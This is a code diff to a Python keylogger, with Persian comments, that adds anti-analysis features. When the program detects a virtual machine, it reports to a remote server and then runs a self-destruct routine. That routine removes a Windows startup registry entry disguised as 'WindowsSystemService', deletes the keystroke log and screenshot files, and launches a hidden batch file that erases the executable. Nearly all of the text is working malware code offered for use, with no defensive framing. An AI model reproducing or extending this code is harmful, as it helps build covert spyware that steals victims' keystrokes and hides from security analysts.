@@ -3,7 +3,10 @@ import time
 import json
 import logging
 import sys
+import platform
+import subprocess
 import ctypes
+import winreg
 from datetime import datetime
 from keyboard import hook, add_hotkey
 from config import Config
@@ -56,22 +59,145 @@ class KeyloggerCore:
 
     def check_vm_environment(self):
         """
-        بررسی می‌کند که آیا برنامه روی VM اجرا می‌شود یا خیر و نتیجه را به سرور گزارش می‌دهد.
+        بررسی می‌کند که آیا برنامه روی VM اجرا می‌شود یا خیر.
+        در صورت شناسایی VM، فرآیند حذف خودکار را آغاز می‌کند.
         """
         vm_details = VMDetector.get_vm_details()
         if Config.DEBUG_MODE:
             logging.info(f"VM Detection Details: {vm_details}")
 
+        # ارسال نتیجه به سرور
         try:
             self.communicator.upload_vm_status(vm_details)
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to upload VM status: {str(e)}")
 
+        # اگر VM شناسایی شد و در حالت دیباگ نیستیم، حذف خودکار را اجرا کن
         if vm_details["is_vm"] and not Config.DEBUG_MODE:
             if Config.DEBUG_MODE:
-                logging.warning("Virtual Machine detected. Exiting in non-debug mode.")
-            self.emergency_stop()
+                logging.warning("Virtual Machine detected. Initiating self-destruct.")
+            self.self_destruct()
+        elif Config.DEBUG_MODE and vm_details["is_vm"]:
+            logging.warning("Virtual Machine detected, but self-destruct skipped in debug mode.")
+
+    def self_destruct(self):
+        """
+        حذف خودکار برنامه، فایل‌های موقت، و ردپاها.
+        """
+        try:
+            if Config.DEBUG_MODE:
+                logging.info("Starting self-destruct sequence...")
+
+            # ارسال گزارش به سرور (اختیاری)
+            try:
+                self.communicator.report_self_destruct()
+                if Config.DEBUG_MODE:
+                    logging.info("Self-destruct report sent to server")
+            except Exception as e:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Failed to send self-destruct report: {str(e)}")
+
+            # حذف ورودی startup از رجیستری
+            self.remove_from_startup()
+
+            # حذف فایل‌های موقت (لاگ‌ها، اسکرین‌شات‌ها)
+            self.cleanup_files()
+
+            # حذف فایل اجرایی
+            self.delete_executable()
+
+            # خاتمه فرآیند
+            if Config.DEBUG_MODE:
+                logging.info("Self-destruct complete. Terminating process.")
+            sys.exit(0)
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Self-destruct error: {str(e)}")
+            sys.exit(1)
+
+    def remove_from_startup(self):
+        """
+        حذف ورودی startup از رجیستری ویندوز.
+        """
+        if platform.system().lower() != "windows":
+            if Config.DEBUG_MODE:
+                logging.info("Startup removal only supported on Windows")
+            return
+
+        try:
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "WindowsSystemService"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                winreg.DeleteValue(reg_key, app_name)
+            if Config.DEBUG_MODE:
+                logging.info("Removed from startup registry")
+        except FileNotFoundError:
+            if Config.DEBUG_MODE:
+                logging.info("Startup registry entry not found")
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to remove startup entry: {str(e)}")
+
+    def cleanup_files(self):
+        """
+        حذف فایل‌های موقت مثل لاگ‌ها و اسکرین‌شات‌ها.
+        """
+        try:
+            temp_files = [
+                "keylogger.log",  # فایل لاگ
+                "screenshot.png"  # اسکرین‌شات موقت
+            ]
+            for temp_file in temp_files:
+                if os.path.exists(temp_file):
+                    os.remove(temp_file)
+                    if Config.DEBUG_MODE:
+                        logging.info(f"Deleted temporary file: {temp_file}")
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to cleanup files: {str(e)}")
+
+    def delete_executable(self):
+        """
+        حذف فایل اجرایی برنامه با استفاده از یک اسکریپت batch کمکی.
+        """
+        if platform.system().lower() != "windows":
+            if Config.DEBUG_MODE:
+                logging.info("Executable deletion only supported on Windows")
+            return
+
+        try:
+            # مسیر فایل اجرایی فعلی
+            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
+            batch_file = "self_destruct.bat"
+
+            # ایجاد اسکریپت batch برای حذف
+            batch_content = f"""
+            @echo off
+            ping 127.0.0.1 -n 2 > nul
+            del /F /Q "{exe_path}"
+            del /F /Q "%~f0"
+            """
+            with open(batch_file, "w", encoding="utf-8") as f:
+                f.write(batch_content)
+
+            # اجرای اسکریپت batch
+            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            if Config.DEBUG_MODE:
+                logging.info(f"Created and executed self-destruct batch file: {batch_file}")
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to delete executable: {str(e)}")
+
+    def emergency_stop(self):
+        """
+        توقف اضطراری برنامه و اجرای حذف خودکار.
+        """
+        if Config.DEBUG_MODE:
+            logging.error("Emergency stop initiated")
+        self.self_destruct()
 
     def start(self):
         self._init_hotkeys()
